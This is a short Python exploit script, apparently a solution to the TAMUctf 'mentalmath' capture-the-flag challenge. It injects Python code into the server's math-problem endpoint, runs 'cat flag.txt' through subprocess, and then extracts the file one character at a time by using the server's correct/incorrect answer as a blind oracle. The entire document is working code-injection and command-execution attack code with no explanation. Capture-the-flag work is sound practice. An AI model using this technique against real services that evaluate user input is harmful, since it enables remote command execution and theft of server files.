import requests
import string
import json

def check(payload, answer):
    url = 'http://mentalmath.tamuctf.com/ajax/new_problem'
    params = {'problem': payload, 'answer': answer}
    headers = {"X-Requested-With": "XMLHttpRequest"}
    r = requests.post(url, data=params, headers=headers)

    return json.loads(r.text)['correct']


length = 56

while 1:
    payload = 'len(__import__("subprocess").check_output(["cat", "flag.txt"]))'

    if check(payload, length):
        print(length)
        break
    length += 1

flag = ''
for index in range(length):
    for char_number in range(32, 127):
        char = chr(char_number)
        payload = f'__import__("subprocess").check_output(["cat","flag.txt"])[{index}]'
        print(char)

        if check(payload, char_number):
            print(index, char)
            flag += char
            break
print(flag)
